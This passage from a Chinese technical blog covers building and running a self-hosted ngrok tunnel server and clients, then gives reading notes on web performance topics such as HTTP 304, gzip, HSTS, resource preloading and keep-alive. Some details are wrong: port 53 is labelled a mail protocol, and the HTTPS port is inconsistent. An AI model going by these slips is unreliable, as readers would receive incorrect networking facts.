与编译客户端的ngrok"></a>2.4、生成服务器端 ngrokd 与编译客户端的ngrok</h3><p>进入&#x2F;root&#x2F;ngrok目录后创建服务器端的 ngrokd，代码如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/ngrok</span><br><span class="line">make release-server</span><br></pre></td></tr></table></figure><p>如果提示下载失败，可能是因为链接国外的服务器会断线的问题，可重新运行一遍 make release-server 。执行成功后，我们可以在&#x2F;root&#x2F;ngrok&#x2F;bin&#x2F;目录下看到 ngrokd 这个文件，这个就是我们后面要开启的服务器端，现在先不要运行。</p><p>然后我们在&#x2F;root&#x2F;ngrok&#x2F;目录中使用交叉编译，编译出几个常用平台的客户端软件，代码如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GOOS=linux GOARCH=amd64 make release-client</span><br><span class="line">GOOS=windows GOARCH=amd64 make release-client</span><br><span class="line">GOOS=linux GOARCH=arm make release-client</span><br></pre></td></tr></table></figure><p>编译后的文件存在于&#x2F;root&#x2F;ngrok&#x2F;bin&#x2F;目录中，他们分别在以自己的操作系统名命名的目录中。我们把生成的文件下载下来存在客户端即可。</p><p>需要注意的是，不同平台使用不同的 GOOS 和 GOARCH，其中GOOS是指编译出来的操作系统 (windows,linux,darwin) ；GOARCH是指对应的构架 (386,amd64,arm)，列表如下：</p><ul><li>Linux 平台 32 位系统：GOOS&#x3D;linux GOARCH&#x3D;386</li><li>Linux 平台 64 位系统：GOOS&#x3D;linux GOARCH&#x3D;amd64</li><li>Windows 平台 32 位系统：GOOS&#x3D;windows GOARCH&#x3D;386</li><li>Windows 平台 64 位系统：GOOS&#x3D;windows GOARCH&#x3D;amd64</li><li>MAC 平台 32 位系统：GOOS&#x3D;darwin GOARCH&#x3D;386</li><li>MAC 平台 64 位系统：GOOS&#x3D;darwin GOARCH&#x3D;amd64</li><li>ARM 平台：GOOS&#x3D;linux GOARCH&#x3D;arm</li></ul><h3 id="2-5、服务器端-ngrokd-与客户端的ngrok的运行测试"><a href="#2-5、服务器端-ngrokd-与客户端的ngrok的运行测试" class="headerlink" title="2.5、服务器端 ngrokd 与客户端的ngrok的运行测试"></a>2.5、服务器端 ngrokd 与客户端的ngrok的运行测试</h3><p>首先我们让服务器端的ngrok开始运行，代码如下所示（三选一即可）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cd /root/ngrok</span></span><br><span class="line"><span class="comment">#NGROK_DOMAIN=&quot;ngrok.testbug.top&quot;</span></span><br><span class="line"><span class="comment">#只启用http连接</span></span><br><span class="line">/root/ngrok/bin/ngrokd -domain=<span class="string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="string">&quot;:6060&quot;</span> -httpsAddr=<span class="string">&quot;:6061&quot;</span> -tunnelAddr=<span class="string">&quot;:6062&quot;</span></span><br><span class="line"><span class="comment">#启用http和https连接</span></span><br><span class="line">/root/ngrok/bin/ngrokd -domain=<span class="string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="string">&quot;:6060&quot;</span> -httpsAddr=<span class="string">&quot;:6061&quot;</span> -tunnelAddr=<span class="string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt</span><br><span class="line"><span class="comment">#如果想让服务器端在我们关闭了终端后依旧可以后台运行，选择下面这句代码，后台运行，启用http和https连接</span></span><br><span class="line">/usr/bin/nohup /root/ngrok/bin/ngrokd -domain=<span class="string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="string">&quot;:6060&quot;</span> -httpsAddr=<span class="string">&quot;:6061&quot;</span> -tunnelAddr=<span class="string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt &gt; /root/ngrok/out.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>上面代码中的一些说明：</p><ul><li>httpAddr 是访问普通的http使用的端口号，客户端用 <a href="#">http:&#x2F;&#x2F;*.ngrok.testbug.top:6060</a> 来访问服务</li><li>httpsAddr 是访问的https使用的端口号,客户端用 <a href="#">https:&#x2F;&#x2F;*.ngrok.testbug.top:6060</a> 来访问服务</li><li>tunnelAddr 是通道的端口号，这个端口是Ngrok用来通信的，所以这个端口在服务器上和客户端上设置必须要对应才可以正常的链接，默认不填写好像是4433</li></ul><p>如果想要开机启动Ngrokd服务，并开启http和https连接服务，可以执行下面的操作：</p><ul><li>针对于CentOS中，在”&#x2F;etc&#x2F;rc.d&#x2F;rc.local”文件最后加入下面的代码：</li><li>针对于Ubuntu Server，在”&#x2F;etc&#x2F;rc.local”文件的最后加入下面的代码:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/nohup /root/ngrok/bin/ngrokd -domain=<span class="string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="string">&quot;:6060&quot;</span> -httpsAddr=<span class="string">&quot;:6061&quot;</span> -tunnelAddr=<span class="string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt &gt; /root/ngrok/out.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></li></ul><p>接下来我们配置客户端，以便于我们在客户端可以成功建立与服务器的连接，并且最终完成内网穿透的需求；</p><p>我们客户端的环境是Windows 10 版本10.0.14393，把下载下来的ngrok.exe文件放在绝对路径中没有中文的文件夹中，然后在该文件夹中新建一个”ngrok.cfg”，页面编码选择为”UTF-8 无BOM格式”，然后里面输入如下内容并保存：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server_addr: <span class="string">&quot;ngrok.testbug.top:6062&quot;</span></span><br><span class="line">trust_host_root_certs: <span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li>如果想要在外网访问内网中的Web服务，则可以使用下面的代码：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ngrok.exe -<span class="built_in">log</span>=ngrok_log.txt -subdomain=<span class="built_in">test</span> -config=<span class="string">&quot;ngrok.cfg&quot;</span> 80</span><br></pre></td></tr></table></figure></li><li>如果想要在外网访问内网中的TCP服务，则可以使用下面的代码(例如访问内网中机器的TCP协议的3389端口)：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ngrok.exe -<span class="built_in">log</span>=ngrok_log.txt -subdomain=<span class="built_in">test</span> -config=<span class="string">&quot;ngrok.cfg&quot;</span> -proto=tcp 3389</span><br></pre></td></tr></table></figure></li></ul><p>上面代码的解释为：</p><ul><li>日志： -log&#x3D;ngrok_log.txt 是记录ngrok的日志，如果前期调试的时候加上这个参数，如果不能访问就可以查看到底是什么问题</li><li>子域名： -subdomain&#x3D;test 是定义访问的时候的子域名，现在访问 ngrok.testbug.top:6060 就可以访问到这一台机器上80端口的服务</li></ul><p><em><strong>备注  常用的工作在TCP协议上的端口列表如下：</strong></em></p><ul><li>53 ：MTP，邮件传输协议</li><li>80 ：HTTP（超文本传输协议）- 用于传输网页</li><li>110 ：POP3，“邮局协议”，第3版 - 用于接收电子邮件</li><li>115 ：SFTP，简单文件传输协议</li><li>3389 ：远程桌面协议（RDP）</li><li>8008&#x2F;8080 ：HTTP 替代端口</li><li>8080 : Apache Tomcat</li></ul><h2 id="三、一些基于的Ngrok的免费内网穿透服务"><a href="#三、一些基于的Ngrok的免费内网穿透服务" class="headerlink" title="三、一些基于的Ngrok的免费内网穿透服务"></a>三、一些基于的Ngrok的免费内网穿透服务</h2><h3 id="3-1、NATAPP-基于ngrok高速内网穿透"><a href="#3-1、NATAPP-基于ngrok高速内网穿透" class="headerlink" title="3.1、NATAPP 基于ngrok高速内网穿透"></a>3.1、<a href="https://natapp.cn/" target="_blank">NATAPP 基于ngrok高速内网穿透</a></h3><p>第一次使用需要注册，竟然只能用手机号注册，注册后可以在个人页面看到存在免费隧道可用，阿里云国内服务器，不支持绑定自己的域名，不支持Https，1M的带宽(估计也是共享带宽)，一分钟60个连接数的限制，最大TCP连接数五个，分配的三级域名以及端口还不定时强制更换，更恶心的是使用这个免费隧道还需要实名认证，不推荐！极不推荐！</p><h3 id="3-2、Ngrok国内免费服务器"><a href="#3-2、Ngrok国内免费服务器" class="headerlink" title="3.2、Ngrok国内免费服务器"></a>3.2、<a href="http://qydev.com/" target="_blank">Ngrok国内免费服务器</a></h3><p>这是我使用的第一个Ngrok内网穿透服务，这应该是一个学生免费提供的的Ngrok内网穿透服务，当初应该是为了贡献闲置资源，现在我感觉用起来越来越舒服，一不需要注册，二不需要实名，三不需要花钱，简直就是Ngrok内网穿透的福音呀！并且还十分稳定，十分良心，建议大家如果觉的好用，给人家捐赠点维护费用，利人利己。强烈推荐这款服务！</p><h3 id="3-3、Sunny-Ngrok内网转发"><a href="#3-3、Sunny-Ngrok内网转发" class="headerlink" title="3.3、Sunny-Ngrok内网转发"></a>3.3、<a href="https://www.ngrok.cc/" target="_blank">Sunny-Ngrok内网转发</a></h3><p>这也是一个体验性挺好的Ngrok内网穿透服务，第一个看到这网站的界面我就猜到了他应该是基于ThinkCMF写的，虽然如果你要使用这个也需要注册，但是人家的注册就不想某些人那样，人家直接使用邮箱就可以注册，还不用邮箱验证，估计邮箱也就是为了找回密码用的，后台界面很简洁，提供两种隧道供选择，一种是香港100M服务器，10元&#x2F;月，一种是香港10M免费的，它的免费隧道可以固定自己的三级域名，也可以把自己的域名CNAME解析到server.ngrok.cc从而使用自定义域名，还有一个有意思的是，它可以设置在http映射的时候是否需要访问认证，这有加了一层安全保障，关键是这些都是免费的，更好的是，似乎我们可以建很多的免费的隧道，这就很好了，也是值得推荐的！</p><h3 id="3-4、魔法隧道"><a href="#3-4、魔法隧道" class="headerlink" title="3.4、魔法隧道"></a>3.4、<a href="http://mofasuidao.cn/" target="_blank">魔法隧道</a></h3><p>据说(知乎上一个人说的)是所谓的最稳定的Ngrok，注册也是需要手机号码的，好吧，我不计较是不是需要用手机号了，登进去管理界面才发现，好嘛<del>签到送流量，我点击了签到，好嘛</del>送了我 0.90M ，果断关了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《Web性能优化与HTTP/2》有感笔记</title>
      <link href="/2017/04/26/web-performance-http2/"/>
      <url>/2017/04/26/web-performance-http2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前段时间本着尝鲜与想释放看书的欲望的初衷入手了Kindle PaperWhite 3，买来后便把之前一直想看但迫于书籍的沉重与携带的不便而没看的书籍塞了进去，其中有一本叫做《Web性能优化与HTTP&#x2F;2》，这是从看云上找到的一本书籍，被题目所吸引，但是放入后才发现这本书中并没有多少字，但是牵扯出的东西却太多了，所以打算写这么一篇，记录一下自己的感受与学习。</p><blockquote><p>下面以书中所提及的知识点为主线，记录我对于各个知识点的学习与感受</p></blockquote><h2 id="二、Http-304"><a href="#二、Http-304" class="headerlink" title="二、Http 304"></a>二、Http 304</h2><p>304 Not Modified是一个在网页浏览过程中不会直接发现的一个提示，在正常浏览网页的时候用户不可见，只有当我们打开Console控制台的时候才会发现，请求列表中存在304响应状态码。</p><p>如果客户端发送了一个带条件的GET请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p><h3 id="2-1、Http-304的响应状态的资源更新机制："><a href="#2-1、Http-304的响应状态的资源更新机制：" class="headerlink" title="2.1、Http 304的响应状态的资源更新机制："></a>2.1、Http 304的响应状态的资源更新机制：</h3><ul><li>可能请求一：当客户端缓存了目标资源但不确定该缓存资源是否是最新版本的时候, 就会发送一个条件请求，这样就可以辨别出一个请求是否是条件请求，在进行条件请求时,304请求的响应头信息里面有两个比较重要的请求头字段：If-Modified-Since【其值为服务器上次返回的Last-Modified响应头中的Date日期值】和 If-None-Match【其值为服务器上次返回的ETag响应头的值】，这两个字段表示发送的是一个条件请求。 </li><li>结果一：服务器会读取到这两个请求头中的值,判断出客户端缓存的资源是否是最新的,如果是的话,服务器就会返回HTTP&#x2F;304 Not Modified响应头, 但没有响应体。客户端收到304响应后,就会从本地缓存中读取对应的资源. </li><li>结果二：服务器认为客户端缓存的资源已经过期了,那么服务器就会返回HTTP&#x2F;200 OK响应,响应体就是该资源当前最新的内容。客户端收到200响应后,就会用新的响应体覆盖掉旧的缓存资源。</li><li>可能请求二：如果客户端第一次请求该资源或者请求该资源的响应头不存在了Last-Modified和ETag请求头字段,则必须无条件(unconditionally)请求该资源,服务器也就必须返回完整的资源数据。</li></ul><h3 id="2-2、使用条件请求机制的原因："><a href="#2-2、使用条件请求机制的原因：" class="headerlink" title="2.2、使用条件请求机制的原因："></a>2.2、使用条件请求机制的原因：</h3><ul><li>因为可以省去传输整个响应体的时间，所以条件请求可以加速网页的打开时间，但仍然会有网络延迟，因为浏览器还是得为每个资源生成一条条件请求，并且等到服务器返回HTTP&#x2F;304响应，才能读取缓存来显示网页。</li></ul><h3 id="2-3、其他可用策略："><a href="#2-3、其他可用策略：" class="headerlink" title="2.3、其他可用策略："></a>2.3、其他可用策略：</h3><ul><li>如果服务器在响应上指定Cache-Control或Expires指令，这样客户端就能知道该资源的可用时间为多长，也就能跳过条件请求的步骤，直接使用缓存中的资源了。</li></ul><h2 id="三、gzip压缩Http-body"><a href="#三、gzip压缩Http-body" class="headerlink" title="三、gzip压缩Http body"></a>三、gzip压缩Http body</h2><p>gzip 是 GNUzip 的缩写，最早用于 UNIX 系统的文件压缩。HTTP 协议上的 gzip 编码是一种用来改进 web 应用程序性能的技术，web 服务器和客户端（浏览器）必须共同支持 gzip。目前主流的浏览器，Chrome,firefox,IE 等都支持该协议。常见的服务器如 Apache，Nginx，IIS 同样支持 gzip。gzip压缩比率在3到10倍左右，可以大大节省服务器的网络带宽。而在实际应用中，并不是对所有文件进行压缩，通常只是压缩静态文件。</p><h3 id="3-1、Web服务器处理HTTP压缩的过程图解："><a href="#3-1、Web服务器处理HTTP压缩的过程图解：" class="headerlink" title="3.1、Web服务器处理HTTP压缩的过程图解："></a>3.1、Web服务器处理HTTP压缩的过程图解：</h3><p><img src="https://cdn.bugwz.com/006qpCDTly1ff2bvzib3oj30vr0g40u6.jpg" alt="Web服务器处理HTTP压缩的过程"></p><h2 id="四、HSTS策略"><a href="#四、HSTS策略" class="headerlink" title="四、HSTS策略"></a>四、HSTS策略</h2><p>HTTP严格传输安全（英语：HTTP Strict Transport Security，缩写：HSTS）是一套由互联网工程任务组发布的互联网安全策略机制。网站可以选择使用HSTS策略，来让浏览器强制使用HTTPS与网站进行通信，以减少会话劫持风险。</p><h3 id="4-1、HSTS策略的作用以使用说明"><a href="#4-1、HSTS策略的作用以使用说明" class="headerlink" title="4.1、HSTS策略的作用以使用说明"></a>4.1、HSTS策略的作用以使用说明</h3><p>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含Strict-Transport-Security字段。非加密传输时设置的HSTS字段无效。</p><p>比如，<a href="https://www.bugwz.com/">https://www.bugwz.com</a> 的响应头含有Strict-Transport-Security: max-age&#x3D;31536000; includeSubDomains。这意味着两点：</p><ul><li>在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> ，浏览器应当自动将 http 转写成 https，然后直接向 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> 发送请求。</li><li>在接下来的一年中，如果 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。</li></ul><h3 id="4-2、HSTS策略的一些问题"><a href="#4-2、HSTS策略的一些问题" class="headerlink" title="4.2、HSTS策略的一些问题"></a>4.2、HSTS策略的一些问题</h3><p>HSTS策略在它看到STS头部声明的max-age的期间内保护了客户端从Http到https跳转的过程中的可能的被拦截。然而，HSTS并不是http回话劫持的完美解决方案。用户在访问HSTS保护的网站时，在以下情况下仍然容易受到攻击：</p><ul><li>以前从未访问过该网站</li><li>最近重新安装了其操作系统</li><li>最近重新安装了其浏览器</li><li>切换到新的浏览器</li><li>切换到一个新的设备如移动电话</li><li>删除浏览器的缓存</li><li>最近没访问过该站并且max-age过期了</li></ul><p>为了解决这个问题，Google坚持维护了一个”HSTS preload list”的站点域名和子域名，并通过<a href="https://hstspreload.appspot.com/" target="_blank">https://hstspreload.appspot.com/</a>【需要额外的手段才可以顺畅访问】提交其域名。该域名列表被分发和硬编码到主流的web浏览器。客户端访问此列表中的域名将主动的使用HTTPS，并拒绝使用HTTP访问该站点。<br>一旦设置了STS头部或者提交了你的域名到HSTS预加载列表，这是不可能将其删除的。这是一个单向不可逆的决定了你的域名必须通过Https进行访问的方法。</p><h2 id="五、资源预加载"><a href="#五、资源预加载" class="headerlink" title="五、资源预加载"></a>五、资源预加载</h2><p>当我们访问一个页面的时候，该页面可能有一些资源存在很大的几率被用户点击查看，那么我们就可能需要对这些资源进行预加载，例如《Web性能优化与HTTP&#x2F;2》这本书中所说的DNS预解析,这就可以减少一些DNS解析时间，提升用户访问的体验。资源预加载这种做法曾经被称为<code>prebrowsing</code>，但这并不是一项单一的技术，可以细分为几个不同的技术：<code>DNS-prefetch</code>、<code>subresource</code> 和标准的 <code>prefetch</code>、<code>preconnect</code>、<code>prerender</code>。</p><h3 id="5-1、DNS-预解析-DNS-Prefetch"><a href="#5-1、DNS-预解析-DNS-Prefetch" class="headerlink" title="5.1、DNS 预解析 DNS-Prefetch"></a>5.1、DNS 预解析 DNS-Prefetch</h3><p>当你浏览一个网页的时候，浏览器会在加载网页时对网页中包含的域名进行解析缓存，这样在你单击当前已经加载完成的网页中的链接时就无需再进行DNS 回源解析，减少用户的等待时间，提高用户体验。</p><p>操作方法跟简单，只需要在文档顶部的 <head> 标签中加入以下代码(例如：其中的host可以为bugwz.com)：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//host/&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这似乎是一个非常微小的性能优化，显得也并非那么重要，但事实并非如此 – <a href="https://docs.google.com/presentation/d/18zlAdKAxnc51y_kj-6sWLmnjl6TLnaru_WH0LJTjP-o/present?slide=id.g120f70e9a_041">Chrome 一直都做了类似的优化</a>。实际上，单纯执行 DNS-Prefetch 只能够微小的提升浏览性能，因为大部分现代浏览器也都内置了预解析的功能，甚至在你在地址栏输入域名时就完成了预解析。通过阅读Chormium 的文档，得到以下信息：</p><ul><li>不用对超链接做手动 dns prefetching，因为 chrome 会自动做 dns prefetching</li><li>chrome 会自动把当前页面的所有带 href 的 link 的 dns 都 prefetch 一遍</li><li>对于一些需要跳转的域名做好预解析，最多可以减少 300~500ms 的加载时间</li></ul><p>兼容性展示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2bxe3v6cj30zb0hcgmb.jpg" alt="DNS-Prefetch"></p><h3 id="5-2、预连接-Preconnect"><a href="#5-2、预连接-Preconnect" class="headerlink" title="5.2、预连接 Preconnect"></a>5.2、预连接 Preconnect</h3><p>与 DNS 预解析类似，<code>preconnect</code> 不仅完成 DNS 预解析，同时还将进行 TCP 握手和建立传输层协议。预先建立 socket 连接，从而消除昂贵的 DNS 查找、TCP 握手和 TLS 往返开销。使用方法是在文档顶部的 <head> 标签中加入以下代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preconnect&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://bugwz.com&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>兼容性展示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2bywyn6pj30za0ir0ti.jpg" alt="预连接 Preconnect"></p><h3 id="5-3、预获取-Prefetching"><a href="#5-3、预获取-Prefetching" class="headerlink" title="5.3、预获取 Prefetching"></a>5.3、预获取 Prefetching</h3><p>如果我们确定某个资源将来一定会被使用到，我们可以让浏览器预先请求该资源并放入浏览器缓存中。例如，一个图片和脚本或任何可以被浏览器缓存的资源，使用方法是在文档顶部的 <head> 标签中加入以下代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;image.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>Prefetching 有两种用法。其中 prefetch 为将来的页面提供了一种低优先级的资源预加载方式，而 subresource 为当前页面提供了一种高优先级的资源预加载。所以，如果资源是当前页面必须的，或者资源需要尽快可用，那么最好使用 subresource。用法如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;subresource&quot;</span> <span class="attr">href</span>=<span class="string">&quot;styles.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意：与 DNS 预解析不同，预获取真正请求并下载了资源，并储存在缓存中。但预获取还依赖于一些条件，某些预获取可能会被浏览器忽略，例如从一个非常缓慢的网络中获取一个庞大的字体文件。并且，Firefox 只会在浏览器闲置时进行资源预获取。目前，字体文件必须等到 DOM 和 CSS 构建完成之后才开始下载，使用预获取就可以轻松绕过该瓶颈。</p><p>兼容性展示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2bywyn6pj30za0ir0ti.jpg" alt="预连接 Preconnect"><br><img src="https://cdn.bugwz.com/006qpCDTly1ff2c0ao4mrj30za0hsq3m.jpg" alt="预获取 subresource"></p><h3 id="5-4、预渲染-Prerender"><a href="#5-4、预渲染-Prerender" class="headerlink" title="5.4、预渲染 Prerender"></a>5.4、预渲染 Prerender</h3><p>这是一个核武器，因为 prerender 可以预先加载文档的所有资源，代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prerender&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://bugwz.com/&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这类似于在一个隐藏的 tab 页中打开了某个链接 – 将下载所有资源、创建 DOM 结构、完成页面布局、应用 CSS 样式和执行 JavaScript 脚本等。当用户真正访问该链接时，隐藏的页面就切换为可见，使页面看起来就是瞬间加载完成一样。Google 搜索在其即时搜索页面中已经应用该技术多年了，微软也宣称在 IE11 中支持该特性。</p><p>需要注意的问题：</p><ul><li>不要滥用该特性，当你知道用户一定会点击某个链接时才可以进行预渲染，因为预加载的开销（抢占 CPU 资源，消耗电池，浪费带宽等）是高昂的，所以必须谨慎行事</li><li>使用 <a href="https://www.w3.org/TR/page-visibility/">Page Visibility API</a> 可以防止页面真正可见前被执行</li></ul><p>兼容性展示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2c0v902ij30z90i0t9e.jpg" alt="预渲染 Prerender"></p><h3 id="5-5、Preload"><a href="#5-5、Preload" class="headerlink" title="5.5、Preload"></a>5.5、Preload</h3><p>preload 是一个新规范，与 prefetch 不同（可能被忽略）的是，浏览器一定会预加载该资源,使用代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preload&quot;</span> <span class="attr">href</span>=<span class="string">&quot;image.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>兼容性展示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2c1f6rb0j30z90hu750.jpg" alt="Preload"></p><h2 id="六、手动管理缓存localStorage"><a href="#六、手动管理缓存localStorage" class="headerlink" title="六、手动管理缓存localStorage"></a>六、手动管理缓存localStorage</h2><p>localStorage是HTML5中的特性，来实现手动控制缓存。大概的思路是，在定义模块时，同时将模块的代码和版本号分别储存到localStorage，在下一次打算请求模块之前，我们先判断模块的最新版本是不是在localStorage中，将不存在的模块组合在一起，请求动态合并的资源。</p><h3 id="6-1、Cookie-LocalStorage-与-SessionStorage"><a href="#6-1、Cookie-LocalStorage-与-SessionStorage" class="headerlink" title="6.1、Cookie, LocalStorage 与 SessionStorage"></a>6.1、Cookie, LocalStorage 与 SessionStorage</h3><ul><li><p>Cookie：Cookie的大小限制为4KB左右，是网景公司的前雇员 Lou Montulli 在1993年3月的发明。它的主要用途有保存登录信息，比如你登录某个网站市场可以看到“记住密码”，这通常就是通过在 Cookie 中存入一段辨别用户身份的数据来实现的。</p></li><li><p>LocalStorage：LocalStorage 是 HTML5 标准中新加入的技术，它并不是什么划时代的新东西,早在 IE 6 时代，就有一个叫 userData 的东西用于本地存储，而当时考虑到浏览器兼容性，更通用的方案是使用 Flash。而如今，localStorage 被大多数浏览器所支持。创建的代码实例如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="property">lastname</span>=<span class="string">&quot;Smith&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">localStorage</span>.<span class="property">lastname</span>);</span><br></pre></td></tr></table></figure></li><li><p>sessionStorage：sessionStorage 与 localStorage 的接口类似，但保存数据的生命周期与 localStorage 不同。做过后端开发的同学应该知道 Session 这个词的意思，直译过来是“会话”。而 sessionStorage 是一个前端的概念，它只是可以将一部分数据在当前会话中保存下来，刷新页面数据依旧存在。但当页面关闭后，sessionStorage 中的数据就会被清空。创建的代码实例如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sessionStorage.<span class="property">lastname</span>=<span class="string">&quot;Smith&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(sessionStorage.<span class="property">lastname</span>);</span><br></pre></td></tr></table></figure></li><li><p>三者对比详情如下所示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ff2c1zus6xj30t809e0tk.jpg" alt="sessionStorage：sessionStorage 与 localStorage对比"></p></li></ul><h3 id="6-2、需要注意的一些地方"><a href="#6-2、需要注意的一些地方" class="headerlink" title="6.2、需要注意的一些地方"></a>6.2、需要注意的一些地方</h3><ul><li>严禁将一些敏感数据放置在Cookie、localStorage 和 sessionStorage 中，因为只要打开Console控制台我就可以查看并修改这些存储在本地的值。</li><li>假如同域下的其他页面被XSS攻击，攻击者就可以篡改localStorage的内容，可能导致原来的页面代码被植入恶意程序。</li><li>在执行每个网页模块之前，需要计算一下代码摘要，对比下服务器给的该模块的摘要，再决定是否使用，也可以使用SRI策略(关于SRI策略的详解信息，可移步<a href="https://imququ.com/post/subresource-integrity.html" target="_blank">这里</a>)，由浏览器帮你做校验。</li></ul><h2 id="七、HTTP持久连接-keep-alive和persistent"><a href="#七、HTTP持久连接-keep-alive和persistent" class="headerlink" title="七、HTTP持久连接 keep alive和persistent"></a>七、HTTP持久连接 keep alive和persistent</h2><p>HTTP持久连接可以避免每次都经历缓慢的连接建立阶段，减少三次握手的RTT延迟，以及每次都执行关闭操作，节省耗时和带宽；避免TCP连接慢启动特性的拥塞适应阶段，从而利用重用TCP连接这一措施加速数据传输。一个客户端对任何服务器或代理最多只能维护两条持久连接，以防服务器过载。HTTP持久连接的两种类型为：</p><ul><li>HTTP&#x2F;1.0+ “keep-alive”连接</li><li>HTTP&#x2F;1.1 “persistent”连接</li></ul><h3 id="7-1、HTTP-x2F-1-0-keep-alive连接"><a href="#7-1、HTTP-x2F-1-0-keep-alive连接" class="headerlink" title="7.1、HTTP&#x2F;1.0+ keep-alive连接"></a>7.1、HTTP&#x2F;1.0+ keep-alive连接</h3><p>HTTP&#x2F;1.0+中支持的是keep-alive连接，keep-alive握手过程如下所示：</p><ul><li><p>HTTP&#x2F;1.0+支持keep-alive连接，但默认并未激活。客户端通过发送一个包含Connection: Keep-Alive首部的请求来请求服务器激活keep-alive连接，即将这条连接保持在打开状态。</p></li><li><p>如果服务器愿意为下一条请求重用此连接，就会在响应中包含相同的首部。若没有，服务器就会在发回响应报文后关闭连接。客户端就是通过检测响应中是否包含Connection: Keep-Alive响应首部来判断服务器是否会在发送响应后关闭连接</p></li><li><p>假如服务器同意使用keep-alive连接，那么接下来客户端必须在所有希望保持持久连接的请求中包含Connection: Keep-Alive首部。如果没有发送该首部，服务器会在那条请求后关闭连接。</p></li><li><p>注意，Connection: Keep-Alive首部只是请求将连接保持在活跃状态。即使服务器和客户端都同意建立持久连接了，它们仍可以在任意时刻关闭空闲的keep-alive连接，且可随意限制keep-alive连接所处理事务的数量。我们可以通过Keep-Alive选项调节它们的行为，具体请看下一部分。</p></li></ul><p>Keep-Alive选项解释说明：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">Keep-Alive</span><span class="punctuation">: </span>max=5, timeout=120</span><br></pre></td></tr></table></figure><ul><li>参数timeout：在Keep-Alive响应首部中发送，告诉客户端服务器估计会在打开状态保持到连接空闲多长时间后关闭连接。</li><li>参数max：在Keep-Alive响应首部中发送，告诉客户端服务器还会为另外几个http事务将连接保持在打开状态。</li><li>注意，这两个参数值仅仅是估计，并非承诺。</li></ul><h3 id="7-2、HTTP-x2F-1-1的persistent连接"><a href="#7-2、HTTP-x2F-1-1的persistent连接" class="headerlink" 